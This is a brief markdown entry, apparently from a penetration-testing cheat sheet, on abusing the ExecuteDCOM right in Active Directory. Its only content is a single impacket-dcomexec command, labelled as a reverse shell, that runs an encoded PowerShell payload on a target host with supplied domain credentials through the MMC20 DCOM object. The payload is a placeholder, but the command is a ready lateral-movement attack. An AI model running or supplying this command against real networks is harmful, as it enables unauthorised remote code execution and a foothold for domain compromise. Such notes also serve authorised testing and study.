---
title: "ExecuteDCOM"
date: 2024-8-3
tags: ["ExecuteDCOM", "active driectory", "ad", "Windows", "dcsync", "secretsdump"]
---

---
### Abuse #1: ExecuteDCOM (From Linux)

```bash
# Revshell
impacket-dcomexec <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET> '<powershell #3 Base64>' -silentcommand -object MMC20
```

<br>